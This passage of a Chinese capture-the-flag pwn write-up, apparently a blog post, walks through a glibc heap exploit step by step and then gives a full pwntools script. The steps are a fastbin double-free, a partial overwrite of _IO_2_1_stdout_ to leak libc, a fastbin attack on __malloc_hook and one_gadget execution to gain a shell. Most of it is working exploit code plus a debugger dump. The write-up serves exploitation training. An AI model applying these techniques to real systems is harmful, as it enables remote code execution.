li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">ad</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'2.del'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'2.del'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    

<span class="token comment" spellcheck="true">#--------------------------Exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">#--------------------------Main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libFile<span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteIp<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h3 id="堆布局"><a href="#堆布局" class="headerlink" title="堆布局"></a>堆布局</h3><pre class=" language-python"><code class="language-python">    ad<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 0 为了使用fastbin attack打入unsoted bin-0x10处</span>

    p <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x50</span>
    <span class="token comment" spellcheck="true">#伪造的堆块,后面要申请到此处来实现修改chunk 2的size和fd</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># prev_size</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># size</span>

    ad<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 1</span>
    ad<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 2 为了partiwritefast bin attack实现打入_IO_2_1_stderr + 157处</span>
    ad<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 3 为了使用fastbin attack打入unsoted bin-0x10处</span>
    ad<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 4 为了与修改后的chunk 2在fastbin中连接起来,然后就可以实现打入IO_2_1_stdout中</span>

    <span class="token comment" spellcheck="true"># for fastbin attack to _free_hook</span>
    ad<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 5 为了fastbin attac 打入malloc_hook - 0x23</span>
    ad<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 6 为了fastbin attac 打入malloc_hook - 0x23</span></code></pre>
<h3 id="打入chunk-2修改size-和fd"><a href="#打入chunk-2修改size-和fd" class="headerlink" title="打入chunk 2修改size 和fd"></a>打入chunk 2修改size 和fd</h3><pre class=" language-python"><code class="language-python">    rm<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 为了 构造fastbin attack</span>
    rm<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

    rm<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 先释放掉chunk 2,使fd 为main_arena + 0x58</span>

    <span class="token comment" spellcheck="true"># 这里采用partial write 方式修改 chunk 3中的fd指向 chunk 2 - 0x10处，这里是我们伪造好的堆块</span>
    ad<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'\x90'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># attack to chunk 2 - 0x10</span>

    ad<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 调整</span>
    ad<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 调整</span>

    <span class="token comment" spellcheck="true"># 修改chunk 2 的size和fd</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 修改为fastbin, 绕过检查</span>
    p <span class="token operator">+=</span> <span class="token string">'\xdd\x25'</span> <span class="token comment" spellcheck="true"># partial write指向_IO_2_1_stderr + 157处</span>
    ad<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># patial write to _IO_2_1_stderr_ + 157</span>
</code></pre>
<h3 id="打入-IO-2-1-stderr-157处"><a href="#打入-IO-2-1-stderr-157处" class="headerlink" title="打入_IO_2_1_stderr + 157处"></a>打入_IO_2_1_stderr + 157处</h3><p>满足size调试如下:</p>
<pre><code>pwndbg&gt; x /40gx (long int)&amp;_IO_2_1_stdout_ - 0x43
0x7f007e1fe5dd &lt;_IO_2_1_stderr_+157&gt;:    0x007e1fd660000000    0x000000000000007f
0x7f007e1fe5ed &lt;_IO_2_1_stderr_+173&gt;:    0x0000000000000000    0x0000000000000000
0x7f007e1fe5fd &lt;_IO_2_1_stderr_+189&gt;:    0x0000000000000000    0x0000000000000000
0x7f007e1fe60d &lt;_IO_2_1_stderr_+205&gt;:    0x0000000000000000    0x007e1fc6e0000000
0x7f007e1fe61d &lt;_IO_2_1_stderr_+221&gt;:    0x00fbad288700007f    0x007e1fe6a3000000
0x7f007e1fe62d &lt;_IO_2_1_stdout_+13&gt;:    0x007e1fe6a300007f    0x007e1fe6a300007f
0x7f007e1fe63d &lt;_IO_2_1_stdout_+29&gt;:    0x007e1fe6a300007f    0x007e1fe6a300007f
0x7f007e1fe64d &lt;_IO_2_1_stdout_+45&gt;:    0x007e1fe6a300007f    0x007e1fe6a300007f
0x7f007e1fe65d &lt;_IO_2_1_stdout_+61&gt;:    0x007e1fe6a400007f    0x000000000000007f</code></pre>
<p>把刚才所构建的fastbin chunk 2放入fastbin 中</p>
<pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true"># fastbin attack to _IO__2_1_stderr + 157</span>
    <span class="token comment" spellcheck="true"># 为了 构造fastbin attack</span>
    rm<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\xa0'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 将fastbin chunk 2放入fastbin 中</span>

    <span class="token comment" spellcheck="true"># for alignment</span>
    ad<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span></code></pre>
<h3 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h3><p>修改<code>_IO_2_1_stdout</code>结构体实现打印出libc中的地址</p>
<pre class=" language-python"><code class="language-python">    p <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x33</span>
    <span class="token comment" spellcheck="true"># _IO_2_1_stdout_ struct</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad3c80</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_2_1_stdout_ flag</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span>
    p <span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>

    ad<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    lib<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\x7f\x00\x00'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7ffff7dd2608</span> <span class="token operator">-</span> <span class="token number">0x7ffff7a0d000</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>lib<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h3 id="打入-malloc-hook-0x23处"><a href="#打入-malloc-hook-0x23处" class="headerlink" title="打入__malloc_hook - 0x23处"></a>打入__malloc_hook - 0x23处</h3><pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true"># fast bin attack to malloc_hook - 0x23</span>
    <span class="token comment" spellcheck="true"># 为了 构造fastbin attack</span>
    rm<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    
    rm<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>    
    rm<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    

    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># for ajust</span>
    ad<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># for ajust</span>


</code></pre>
<h3 id="修改malloc-hook-和realloc-hook打one-gadget"><a href="#修改malloc-hook-和realloc-hook打one-gadget" class="headerlink" title="修改malloc_hook 和realloc_hook打one_gadget"></a>修改malloc_hook 和realloc_hook打one_gadget</h3><p>通过realloc的push次数来调整execve的第二个参数</p>
<pre class=" language-python"><code class="language-python">    gadget <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span> <span class="token number">0x4526a</span><span class="token punctuation">,</span> <span class="token number">0xf02a4</span><span class="token punctuation">,</span> <span class="token number">0xf1147</span><span class="token punctuation">]</span>
    one_gadget <span class="token operator">=</span> lib<span class="token punctuation">.</span>address <span class="token operator">+</span> gadget<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>

    p <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x13</span> <span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span></code></pre>
<h3 id="get-shell-1"><a href="#get-shell-1" class="headerlink" title="get shell"></a>get shell</h3><pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true"># get shell</span>
    ru<span class="token punctuation">(</span><span class="token string">'del'</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span></code></pre>
<h2 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># Author: I0gan</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#from LibcSearcher import LibcSearcher</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
<span class="token comment" spellcheck="true">#context(arch = 'i386', os = 'linux', log_level='debug')</span>
<span class="token comment" spellcheck="true">#context(arch = 'amd64', os = 'linux', log_level='debug')</span>

exeFile <span class="token operator">=</span> <span class="token string">'pwn'</span>
libFile <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>

remoteIp <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>
remotePort <span class="token operator">=</span> <span class="token number">0</span>

LOCAL <span class="token operator">=</span> <span class="token number">1</span>
LIB   <span class="token operator">=</span> <span class="token number">1</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">ad</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'2.del'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'2.del'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    

<span class="token comment" spellcheck="true">#--------------------------Exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ad<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 0</span>

    p <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x50</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>

    ad<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 1</span>
    ad<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 2</span>
    ad<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 3</span>
    ad<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 4</span>

    <span class="token comment" spellcheck="true"># for fastbin attack to _free_hook</span>
    ad<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 5</span>
    ad<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 6</span>


    rm<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

    rm<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># for patial write to </span>

    ad<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'\x90'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># attack to chunk 2 - 0x10</span>

    ad<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>

    p <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> <span class="token string">'\xdd\x25'</span>
    ad<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># patial write to _IO_2_1_stderr_ + 157</span>


    <span class="token comment" spellcheck="true"># fastbin attack to _IO__2_1_stderr + 157</span>
    rm<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\xa0'</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># for alignment</span>
    ad<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>

    p <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x33</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad3c80</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span>
    p <span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>

    ad<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    lib<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\x7f\x00\x00'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7ffff7dd2608</span> <span class="token operator">-</span> <span class="token number">0x7ffff7a0d000</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>lib<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># fast bin attack to malloc_hook - 0x23</span>
    rm<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    
    rm<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>    
    rm<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    

    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># for ajust</span>
    ad<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># for ajust</span>


    gadget <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span> <span class="token number">0x4526a</span><span class="token punctuation">,</span> <span class="token number">0xf02a4</span><span class="token punctuation">,</span> <span class="token number">0xf1147</span><span class="token punctuation">]</span>
    one_gadget <span class="token operator">=</span> lib<span class="token punctuation">.</span>address <span class="token operator">+</span> gadget<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>

    p <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x13</span> <span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># get shell</span>
    ru<span class="token punctuation">(</span><span class="token string">'del'</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#db()</span>

<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
